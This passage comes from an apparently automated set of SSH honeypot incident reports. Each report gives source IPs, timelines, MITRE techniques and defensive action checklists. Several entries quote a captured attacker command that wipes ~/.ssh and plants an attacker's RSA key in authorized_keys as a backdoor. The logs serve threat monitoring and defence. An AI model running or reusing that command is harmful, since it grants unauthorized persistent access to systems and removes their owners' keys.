- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-617cc2fa5a30

| Field | Detail |
|---|---|
| **Source IP** | `91.99.110[.]230` |
| **First Seen** | 2026-04-19 14:17 |
| **Last Seen** | 2026-04-19 14:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:17:16` | `cowrie.session.connect` |
| `2026-04-19 14:17:16` | `cowrie.client.version` |
| `2026-04-19 14:17:16` | `cowrie.client.kex` |
| `2026-04-19 14:17:17` | `cowrie.login.success` |
| `2026-04-19 14:17:17` | `cowrie.session.params` |
| `2026-04-19 14:17:17` | `cowrie.command.input` |
| `2026-04-19 14:17:17` | `cowrie.command.failed` |
| `2026-04-19 14:17:17` | `cowrie.log.closed` |
| `2026-04-19 14:17:18` | `cowrie.session.params` |
| `2026-04-19 14:17:18` | `cowrie.command.input` |
| `2026-04-19 14:17:18` | `cowrie.session.file_download` |
| `2026-04-19 14:17:18` | `cowrie.log.closed` |
| `2026-04-19 14:17:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.99.110[.]230` to AbuseIPDB if not already reported
- [ ] Block `91.99.110[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e735c78f1d4e

| Field | Detail |
|---|---|
| **Source IP** | `91.99.110[.]230` |
| **First Seen** | 2026-04-19 14:17 |
| **Last Seen** | 2026-04-19 14:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:17:20` | `cowrie.session.connect` |
| `2026-04-19 14:17:20` | `cowrie.client.version` |
| `2026-04-19 14:17:20` | `cowrie.client.kex` |
| `2026-04-19 14:17:21` | `cowrie.login.success` |
| `2026-04-19 14:17:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.99.110[.]230` to AbuseIPDB if not already reported
- [ ] Block `91.99.110[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dc94b9abaf8

| Field | Detail |
|---|---|
| **Source IP** | `103.189.235[.]33` |
| **First Seen** | 2026-04-19 14:18 |
| **Last Seen** | 2026-04-19 14:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:18:06` | `cowrie.session.connect` |
| `2026-04-19 14:18:06` | `cowrie.client.version` |
| `2026-04-19 14:18:06` | `cowrie.client.kex` |
| `2026-04-19 14:18:06` | `cowrie.login.success` |
| `2026-04-19 14:18:07` | `cowrie.session.params` |
| `2026-04-19 14:18:07` | `cowrie.command.input` |
| `2026-04-19 14:18:07` | `cowrie.command.failed` |
| `2026-04-19 14:18:07` | `cowrie.log.closed` |
| `2026-04-19 14:18:07` | `cowrie.session.params` |
| `2026-04-19 14:18:07` | `cowrie.command.input` |
| `2026-04-19 14:18:07` | `cowrie.session.file_download` |
| `2026-04-19 14:18:07` | `cowrie.log.closed` |
| `2026-04-19 14:18:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.235[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.189.235[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f29485b14bf2

| Field | Detail |
|---|---|
| **Source IP** | `103.189.235[.]33` |
| **First Seen** | 2026-04-19 14:18 |
| **Last Seen** | 2026-04-19 14:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:18:08` | `cowrie.session.connect` |
| `2026-04-19 14:18:08` | `cowrie.client.version` |
| `2026-04-19 14:18:08` | `cowrie.client.kex` |
| `2026-04-19 14:18:09` | `cowrie.login.success` |
| `2026-04-19 14:18:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.235[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.189.235[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c13752d8a1b

| Field | Detail |
|---|---|
| **Source IP** | `91.99.110[.]230` |
| **First Seen** | 2026-04-19 14:18 |
| **Last Seen** | 2026-04-19 14:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:18:36` | `cowrie.session.connect` |
| `2026-04-19 14:18:36` | `cowrie.client.version` |
| `2026-04-19 14:18:36` | `cowrie.client.kex` |
| `2026-04-19 14:18:37` | `cowrie.login.success` |
| `2026-04-19 14:18:37` | `cowrie.session.params` |
| `2026-04-19 14:18:37` | `cowrie.command.input` |
| `2026-04-19 14:18:37` | `cowrie.command.failed` |
| `2026-04-19 14:18:37` | `cowrie.log.closed` |
| `2026-04-19 14:18:38` | `cowrie.session.params` |
| `2026-04-19 14:18:38` | `cowrie.command.input` |
| `2026-04-19 14:18:38` | `cowrie.session.file_download` |
| `2026-04-19 14:18:38` | `cowrie.log.closed` |
| `2026-04-19 14:18:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.99.110[.]230` to AbuseIPDB if not already reported
- [ ] Block `91.99.110[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-023c48931dde

| Field | Detail |
|---|---|
| **Source IP** | `91.99.110[.]230` |
| **First Seen** | 2026-04-19 14:18 |
| **Last Seen** | 2026-04-19 14:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:18:40` | `cowrie.session.connect` |
| `2026-04-19 14:18:40` | `cowrie.client.version` |
| `2026-04-19 14:18:40` | `cowrie.client.kex` |
| `2026-04-19 14:18:41` | `cowrie.login.success` |
| `2026-04-19 14:18:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.99.110[.]230` to AbuseIPDB if not already reported
- [ ] Block `91.99.110[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdb19a9be873

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 14:18 |
| **Last Seen** | 2026-04-19 14:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:18:47` | `cowrie.session.connect` |
| `2026-04-19 14:18:47` | `cowrie.client.version` |
| `2026-04-19 14:18:47` | `cowrie.client.kex` |
| `2026-04-19 14:18:48` | `cowrie.login.success` |
| `2026-04-19 14:18:48` | `cowrie.session.params` |
| `2026-04-19 14:18:48` | `cowrie.command.input` |
| `2026-04-19 14:18:48` | `cowrie.command.failed` |
| `2026-04-19 14:18:49` | `cowrie.log.closed` |
| `2026-04-19 14:18:49` | `cowrie.session.params` |
| `2026-04-19 14:18:49` | `cowrie.command.input` |
| `2026-04-19 14:18:50` | `cowrie.session.file_download` |
| `2026-04-19 14:18:50` | `cowrie.log.closed` |
| `2026-04-19 14:18:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac6f64b74394

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 14:18 |
| **Last Seen** | 2026-04-19 14:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:18:52` | `cowrie.session.connect` |
| `2026-04-19 14:18:52` | `cowrie.client.version` |
| `2026-04-19 14:18:52` | `cowrie.client.kex` |
| `2026-04-19 14:18:53` | `cowrie.login.success` |
| `2026-04-19 14:18:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee53e43a2ce2

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
| **First Seen** | 2026-04-19 14:19 |
| **Last Seen** | 2026-04-19 14:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:19:09` | `cowrie.session.connect` |
| `2026-04-19 14:19:09` | `cowrie.client.version` |
| `2026-04-19 14:19:09` | `cowrie.client.kex` |
| `2026-04-19 14:19:10` | `cowrie.login.success` |
| `2026-04-19 14:19:10` | `cowrie.session.params` |
| `2026-04-19 14:19:10` | `cowrie.command.input` |
| `2026-04-19 14:19:10` | `cowrie.command.failed` |
| `2026-04-19 14:19:10` | `cowrie.log.closed` |
| `2026-04-19 14:19:11` | `cowrie.session.params` |
| `2026-04-19 14:19:11` | `cowrie.command.input` |
| `2026-04-19 14:19:11` | `cowrie.session.file_download` |
| `2026-04-19 14:19:11` | `cowrie.log.closed` |
| `2026-04-19 14:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-285d715c30d9

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
| **First Seen** | 2026-04-19 14:19 |
| **Last Seen** | 2026-04-19 14:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:19:13` | `cowrie.session.connect` |
| `2026-04-19 14:19:13` | `cowrie.client.version` |
| `2026-04-19 14:19:13` | `cowrie.client.kex` |
| `2026-04-19 14:19:14` | `cowrie.login.success` |
| `2026-04-19 14:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbeca3d10ab3

| Field | Detail |
|---|---|
| **Source IP** | `187.141.71[.]166` |
| **First Seen** | 2026-04-19 14:19 |
| **Last Seen** | 2026-04-19 14:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:19:19` | `cowrie.session.connect` |
| `2026-04-19 14:19:19` | `cowrie.client.version` |
| `2026-04-19 14:19:20` | `cowrie.client.kex` |
| `2026-04-19 14:19:21` | `cowrie.login.success` |
| `2026-04-19 14:19:21` | `cowrie.session.params` |
| `2026-04-19 14:19:21` | `cowrie.command.input` |
| `2026-04-19 14:19:21` | `cowrie.command.failed` |
| `2026-04-19 14:19:22` | `cowrie.log.closed` |
| `2026-04-19 14:19:22` | `cowrie.session.params` |
| `2026-04-19 14:19:22` | `cowrie.command.input` |
| `2026-04-19 14:19:23` | `cowrie.session.file_download` |
| `2026-04-19 14:19:23` | `cowrie.log.closed` |
| `2026-04-19 14:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.141.71[.]166` to AbuseIPDB if not already reported
- [ ] Block `187.141.71[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dfd52f43b90

| Field | Detail |
|---|---|
| **Source IP** | `187.141.71[.]166` |
| **First Seen** | 2026-04-19 14:19 |
| **Last Seen** | 2026-04-19 14:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:19:26` | `cowrie.session.connect` |
| `2026-04-19 14:19:26` | `cowrie.client.version` |
| `2026-04-19 14:19:26` | `cowrie.client.kex` |
| `2026-04-19 14:19:27` | `cowrie.login.success` |
| `2026-04-19 14:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.141.71[.]166` to AbuseIPDB if not already reported
- [ ] Block `187.141.71[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-caa20163bb86

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
| **First Seen** | 2026-04-19 14:21 |
| **Last Seen** | 2026-04-19 14:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:21:56` | `cowrie.session.connect` |
| `2026-04-19 14:21:56` | `cowrie.client.version` |
| `2026-04-19 14:21:56` | `cowrie.client.kex` |
| `2026-04-19 14:21:57` | `cowrie.login.success` |
| `2026-04-19 14:21:57` | `cowrie.session.params` |
| `2026-04-19 14:21:57` | `cowrie.command.input` |
| `2026-04-19 14:21:57` | `cowrie.command.failed` |
| `2026-04-19 14:21:57` | `cowrie.log.closed` |
| `2026-04-19 14:21:58` | `cowrie.session.params` |
| `2026-04-19 14:21:58` | `cowrie.command.input` |
| `2026-04-19 14:21:58` | `cowrie.session.file_download` |
| `2026-04-19 14:21:58` | `cowrie.log.closed` |
| `2026-04-19 14:22:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3702d58aefd9

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
| **First Seen** | 2026-04-19 14:22 |
| **Last Seen** | 2026-04-19 14:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:22:00` | `cowrie.session.connect` |
| `2026-04-19 14:22:00` | `cowrie.client.version` |
| `2026-04-19 14:22:00` | `cowrie.client.kex` |
| `2026-04-19 14:22:01` | `cowrie.login.success` |
| `2026-04-19 14:22:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31b8b2d386dd

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 14:22 |
| **Last Seen** | 2026-04-19 14:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:22:33` | `cowrie.session.connect` |
| `2026-04-19 14:22:33` | `cowrie.client.version` |
| `2026-04-19 14:22:33` | `cowrie.client.kex` |
| `2026-04-19 14:22:34` | `cowrie.login.success` |
| `2026-04-19 14:22:34` | `cowrie.session.params` |
| `2026-04-19 14:22:34` | `cowrie.command.input` |
| `2026-04-19 14:22:34` | `cowrie.command.failed` |
| `2026-04-19 14:22:35` | `cowrie.log.closed` |
| `2026-04-19 14:22:35` | `cowrie.session.params` |
| `2026-04-19 14:22:35` | `cowrie.command.input` |
| `2026-04-19 14:22:36` | `cowrie.session.file_download` |
| `2026-04-19 14:22:36` | `cowrie.log.closed` |
| `2026-04-19 14:22:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e70788c26cbb

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 14:22 |
| **Last Seen** | 2026-04-19 14:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:22:38` | `cowrie.session.connect` |
| `2026-04-19 14:22:38` | `cowrie.client.version` |
| `2026-04-19 14:22:38` | `cowrie.client.kex` |
| `2026-04-19 14:22:39` | `cowrie.login.success` |
| `2026-04-19 14:22:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0feb9276b27

| Field | Detail |
|---|---|
| **Source IP** | `91.99.110[.]230` |
| **First Seen** | 2026-04-19 14:24 |
| **Last Seen** | 2026-04-19 14:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
